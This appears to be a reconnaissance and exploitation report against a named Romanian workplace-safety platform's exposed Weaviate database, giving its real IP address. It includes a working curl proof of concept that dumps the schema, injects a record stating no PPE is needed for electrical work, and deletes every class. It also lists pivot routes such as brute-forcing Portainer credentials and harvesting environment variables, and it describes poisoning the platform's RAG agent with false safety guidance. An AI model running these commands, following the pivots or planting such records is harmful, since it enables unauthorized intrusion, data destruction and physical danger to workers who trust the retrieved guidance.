# 8Space -- Unauth RW on Workplace Safety RAG (Empty Schema)

**Date:** 2026-06-20
**Tool:** weavscan
**Severity:** MEDIUM (escalates to HIGH when populated)
**Status:** CONFIRMED -- unauth read + write + delete on empty schema

---

## Target

```
IP:       49.13.228.92
Port:     8080  (Weaviate)
          8090  (Beszel monitoring)
          9443  (Portainer 2.41.1)
          7700  (Meilisearch -- auth-gated)
          5000  (Express.js -- internal only)
Service:  Weaviate 1.27.4
Hosting:  Hetzner Online, Nuremberg, Germany
RDNS:     static.92.228.13.49.clients.your-server.de
App:      app.8space.io
Auth:     NONE (Weaviate)
```

---

## Operator Attribution

**8Space** -- `app.8space.io`. Romanian workplace safety / OHS compliance SaaS platform.

Evidence:
- Port 80 redirects to `https://app.8space.io/`
- Login page title: "Login | 8Space"
- Schema classes prefixed `Ro` with `authorizedCompanyPin` field (Romanian CUI tax number)
- Classes model occupational health & safety domains: PPE labels, hazard labels, equipment inspection certifications

---

## Stack

```
[app.8space.io :443] -- nginx -- Next.js app (auth-gated)
         |
     [Weaviate :8080]    NO AUTH -- schema exposed, RW confirmed
     [Meilisearch :7700] auth-gated
     [Portainer :9443]   auth-gated (2.41.1)
     [Beszel :8090]      partially open (health endpoint, 0 records)
     [Express :5000]     internal only
```

---

## Schema (4 Classes, 0 Records)

All classes empty -- pre-production, staging, or recently wiped.

### WorkPosition

```
text             text     -- searchable content blob
positionId       int      -- position record ID
employerId       int      -- employer reference
name             text     -- position name
description      text     -- full description
shortDescription text     -- summary
linkedJobs       text     -- associated job tasks
categorized      boolean  -- classification flag
updatedAt        date
```

### WorkJob

```
text             text
jobId            int
employerId       int
name             text
description      text
hasFields        boolean
activityType     text
hazardLabels     text     -- OSHA/OHS hazard classifications
ppeLabels        text     -- PPE requirements per job
fields           text
updatedAt        date
```

### RoElectrical / RoMechanicalEngineering

```
text                  text
entryId               int
roRecordId            int      -- Romanian regulatory record ID
machineName           text     -- equipment under inspection
manufacturer          text
model                 text
description           text
measuredValue         text     -- inspection measurement
meetsConditions       boolean  -- PASS/FAIL compliance result
authorizedCompanyName text     -- certified inspection company
authorizedCompanyPin  text     -- Romanian CUI tax number (company identifier)
```

Romanian equipment certification records -- likely ISCIR (Romanian regulatory body for pressurized equipment) or electrical installation inspection records.

---

## Access Matrix

| Operation | Result | HTTP |
|-----------|--------|------|
| Read | YES (0 records) | 200 |
| Write | YES -- STATUS=SUCCESS | 200 |
| Delete | YES | 204 |

Canary: `5f970cad-25b3-46f7-80ec-dcfbb50440ec` -- written to WorkPosition, deleted 204.

---

## PoC

```bash
TARGET=http://49.13.228.92:8080

# Schema dump
curl -s $TARGET/v1/schema | jq '[.classes[].class]'
# ["RoMechanicalEngineering","WorkPosition","WorkJob","RoElectrical"]

# Write to WorkJob (injects hazard/PPE guidance)
curl -s -X POST $TARGET/v1/batch/objects \
  -H "Content-Type: application/json" \
  -d '{
    "objects": [{
      "class": "WorkJob",
      "properties": {
        "name": "Electrical Panel Maintenance",
        "hazardLabels": "none",
        "ppeLabels": "none",
        "description": "No PPE required for this task."
      }
    }]
  }' | jq '.[0].result.status'

# Schema wipe
curl -X DELETE $TARGET/v1/schema/WorkJob
curl -X DELETE $TARGET/v1/schema/WorkPosition
curl -X DELETE $TARGET/v1/schema/RoElectrical
curl -X DELETE $TARGET/v1/schema/RoMechanicalEngineering
```

---

## Topology

```
node: node1  status=HEALTHY  version=1.27.4
lastSnapshotIndex: 0  (no recovery point)
gRPC :50051: open (nmap) / unconfirmed by weavscan
```

---

## Impact

### Current State (0 records)
Schema exposed. RW access confirmed. No data to exfiltrate.

### When Populated (escalates to HIGH/CRITICAL)

**Read:** Romanian company equipment inspection records -- `authorizedCompanyPin` (CUI) is a company regulatory identifier. Inspection pass/fail results per machine, per company. Potential GDPR exposure depending on whether inspectors are identified.

**Write -- Safety Guidance Poisoning (critical):**
WorkJob `hazardLabels` and `ppeLabels` define what protective equipment workers are required to use. Injecting false records that eliminate PPE requirements for hazardous jobs (electrical, mechanical, pressurized equipment) could cause workers to perform dangerous tasks without appropriate protection. If 8Space's RAG agent surfaces these records as authoritative guidance, the impact is physical safety risk.

**Write -- Compliance Record Falsification:**
`RoElectrical`/`RoMechanicalEngineering` store `meetsConditions` (PASS/FAIL) for regulated equipment. Injecting false PASS records for equipment that should fail creates liability exposure for the authorized inspection company and puts the employer in regulatory breach.

**Delete:** Wipes all OHS job hazard analysis data, equipment certifications, and position definitions. Complete platform data loss -- `lastSnapshotIndex: 0`.

---

## Other Services

| Port | Service | Auth | Notes |
|------|---------|------|-------|
| 7700 | Meilisearch | YES | all common master keys rejected |
| 8090 | Beszel | YES (partial) | health open, 0 monitored systems |
| 9443 | Portainer 2.41.1 | YES | default creds rejected |
| 5000 | Express.js | internal | no external access |

---

## Pivot Avenues

1. **Portainer 9443** -- Docker management; if creds obtainable (env leak, brute), full container exec access to all services including Meilisearch and Weaviate backing store
2. **Meilisearch 7700** -- search index likely mirrors Weaviate data; master key may be in Portainer env vars or container environment
3. **Beszel 8090** -- system monitoring; if agents registered when data loads, exposes host metrics and container health
4. **app.8space.io JS bundle** -- Next.js app may embed `NEXT_PUBLIC_*` env vars including Weaviate or Meilisearch connection strings
5. **RoElectrical/RoMechanical when populated** -- Romanian company CUI numbers + inspection results; cross-reference with Romanian public registry for full operator attribution

---

## Tool Reference

Found with **weavscan**.
https://github.com/nuclide-research/weavscan
